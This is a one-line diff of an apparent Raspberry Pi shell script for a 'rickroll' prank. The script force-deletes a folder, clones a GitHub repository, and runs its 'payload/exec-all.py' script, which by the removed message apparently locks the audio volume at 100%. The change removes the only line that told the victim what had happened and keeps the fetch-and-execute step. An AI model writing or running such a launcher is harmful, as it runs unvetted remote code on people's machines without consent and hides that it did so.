@@ -1,1 +1,1 @@
-cd /home/pi/Desktop && echo "Hello! I see you found me! Good luck getting your audio slider off 100%! (Coded with good intentions, github.com/BenPI88)" > rickastley.txt && rm -rf /home/pi/Documents/rickroll && cd /home/pi/Documents && git clone https://github.com/BenPI88/rickroll.git && cd rickroll && cd payload && python exec-all.py
+rm -rf /home/pi/Documents/rickroll && cd /home/pi/Documents && git clone https://github.com/BenPI88/rickroll.git && cd rickroll && cd payload && python exec-all.py
